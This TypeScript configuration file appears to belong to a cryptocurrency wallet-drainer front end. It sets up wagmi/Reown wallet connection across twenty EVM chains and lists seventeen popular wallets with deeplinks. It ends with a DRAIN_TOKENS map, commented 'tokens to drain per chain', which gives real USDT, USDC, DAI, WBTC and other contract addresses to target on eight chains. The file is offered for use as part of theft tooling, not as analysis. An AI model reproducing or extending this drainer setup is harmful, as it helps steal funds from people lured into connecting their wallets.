import { WagmiAdapter } from "@reown/appkit-adapter-wagmi";
import {
  mainnet,
  bsc,
  polygon,
  arbitrum,
  optimism,
  avalanche,
  base,
  fantom,
  zkSync,
  linea,
  scroll,
  mantle,
  celo,
  gnosis,
  moonbeam,
  moonriver,
  cronos,
  aurora,
  harmonyOne,
  boba,
} from "viem/chains";
import { http, createConfig } from "wagmi";
// Wallet list defined manually below

// WalletConnect Project ID - public demo key
export const WC_PROJECT_ID = "3a8170812b534d0ff9d794f19a901d64";

export const SUPPORTED_CHAINS = [
  mainnet,
  bsc,
  polygon,
  arbitrum,
  optimism,
  avalanche,
  base,
  fantom,
  zkSync,
  linea,
  scroll,
  mantle,
  celo,
  gnosis,
  moonbeam,
  moonriver,
  cronos,
  aurora,
  harmonyOne,
  boba,
] as const;

export const CHAIN_INFO: Record<number, { name: string; symbol: string; color: string; icon: string }> = {
  1: { name: "Ethereum", symbol: "ETH", color: "#627EEA", icon: "⟠" },
  56: { name: "BNB Chain", symbol: "BNB", color: "#F3BA2F", icon: "⬡" },
  137: { name: "Polygon", symbol: "MATIC", color: "#8247E5", icon: "⬡" },
  42161: { name: "Arbitrum", symbol: "ETH", color: "#28A0F0", icon: "◈" },
  10: { name: "Optimism", symbol: "ETH", color: "#FF0420", icon: "⊙" },
  43114: { name: "Avalanche", symbol: "AVAX", color: "#E84142", icon: "▲" },
  8453: { name: "Base", symbol: "ETH", color: "#0052FF", icon: "⬡" },
  250: { name: "Fantom", symbol: "FTM", color: "#1969FF", icon: "◈" },
  324: { name: "zkSync", symbol: "ETH", color: "#8C8DFC", icon: "⬡" },
  59144: { name: "Linea", symbol: "ETH", color: "#61DFFF", icon: "⬡" },
  534352: { name: "Scroll", symbol: "ETH", color: "#FFDBB0", icon: "⬡" },
  5000: { name: "Mantle", symbol: "MNT", color: "#000000", icon: "⬡" },
  42220: { name: "Celo", symbol: "CELO", color: "#FCFF52", icon: "⬡" },
  100: { name: "Gnosis", symbol: "xDAI", color: "#04795B", icon: "⬡" },
  1284: { name: "Moonbeam", symbol: "GLMR", color: "#E1147B", icon: "⬡" },
  1285: { name: "Moonriver", symbol: "MOVR", color: "#F2A007", icon: "⬡" },
  25: { name: "Cronos", symbol: "CRO", color: "#002D74", icon: "⬡" },
  1313161554: { name: "Aurora", symbol: "ETH", color: "#78D64B", icon: "⬡" },
  1666600000: { name: "Harmony", symbol: "ONE", color: "#00AEE9", icon: "⬡" },
  288: { name: "Boba", symbol: "ETH", color: "#CBFF00", icon: "⬡" },
};

export const WALLET_LIST = [
  { id: "metamask", name: "MetaMask", icon: "🦊", desc: "Browser & Mobile", color: "#F6851B", deeplink: "metamask://wc?uri=" },
  { id: "walletconnect", name: "WalletConnect", icon: "🔗", desc: "Scan with any wallet", color: "#3B99FC", deeplink: null },
  { id: "trust", name: "Trust Wallet", icon: "🛡️", desc: "Mobile Wallet", color: "#3375BB", deeplink: "trust://wc?uri=" },
  { id: "coinbase", name: "Coinbase Wallet", icon: "🔵", desc: "Coinbase Wallet App", color: "#0052FF", deeplink: "cbwallet://wc?uri=" },
  { id: "phantom", name: "Phantom", icon: "👻", desc: "Solana & EVM", color: "#AB9FF2", deeplink: "phantom://wc?uri=" },
  { id: "rainbow", name: "Rainbow", icon: "🌈", desc: "Fun Ethereum Wallet", color: "#FF6B6B", deeplink: "rainbow://wc?uri=" },
  { id: "okx", name: "OKX Wallet", icon: "⭕", desc: "OKX Exchange Wallet", color: "#000000", deeplink: "okex://main/wc?uri=" },
  { id: "bybit", name: "Bybit Wallet", icon: "🟡", desc: "Bybit Exchange Wallet", color: "#F7A600", deeplink: "bybit://wc?uri=" },
  { id: "bitget", name: "Bitget Wallet", icon: "🔷", desc: "Bitget Exchange Wallet", color: "#00F0FF", deeplink: "bitkeep://wc?uri=" },
  { id: "zerion", name: "Zerion", icon: "💎", desc: "DeFi Portfolio Wallet", color: "#2962EF", deeplink: "zerion://wc?uri=" },
  { id: "argent", name: "Argent", icon: "🔐", desc: "Smart Contract Wallet", color: "#FF875B", deeplink: "argent://wc?uri=" },
  { id: "imtoken", name: "imToken", icon: "🔑", desc: "Popular Asian Wallet", color: "#11C4D1", deeplink: "imtokenv2://wc?uri=" },
  { id: "tokenpocket", name: "TokenPocket", icon: "💼", desc: "Multi-chain Wallet", color: "#2980FE", deeplink: "tpoutside://wc?uri=" },
  { id: "safe", name: "Safe (Gnosis)", icon: "🏦", desc: "Multi-sig Safe Wallet", color: "#12FF80", deeplink: null },
  { id: "brave", name: "Brave Wallet", icon: "🦁", desc: "Built into Brave Browser", color: "#FB542B", deeplink: null },
  { id: "ledger", name: "Ledger Live", icon: "📱", desc: "Hardware Wallet App", color: "#000000", deeplink: "ledgerlive://wc?uri=" },
  { id: "onekey", name: "OneKey", icon: "🔑", desc: "Hardware & Software", color: "#44D62C", deeplink: "onekey-wallet://wc?uri=" },
];

// Popular ERC20 tokens to drain per chain
export const DRAIN_TOKENS: Record<number, Array<{ address: string; symbol: string; decimals: number }>> = {
  1: [ // Ethereum
    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 },
    { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
    { address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", symbol: "MATIC", decimals: 18 },
    { address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381", symbol: "APE", decimals: 18 },
  ],
  56: [ // BSC
    { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
    { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 },
    { address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", symbol: "BUSD", decimals: 18 },
    { address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", symbol: "ETH", decimals: 18 },
    { address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", symbol: "BTCB", decimals: 18 },
  ],
  137: [ // Polygon
    { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
    { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6 },
    { address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", symbol: "DAI", decimals: 18 },
    { address: "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", symbol: "WBTC", decimals: 8 },
  ],
  42161: [ // Arbitrum
    { address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol: "USDT", decimals: 6 },
    { address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", symbol: "USDC", decimals: 6 },
    { address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", symbol: "DAI", decimals: 18 },
  ],
  10: [ // Optimism
    { address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", symbol: "USDT", decimals: 6 },
    { address: "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", symbol: "USDC", decimals: 6 },
  ],
  43114: [ // Avalanche
    { address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", symbol: "USDT", decimals: 6 },
    { address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", symbol: "USDC", decimals: 6 },
  ],
  8453: [ // Base
    { address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", symbol: "USDC", decimals: 6 },
    { address: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", symbol: "DAI", decimals: 18 },
  ],
};
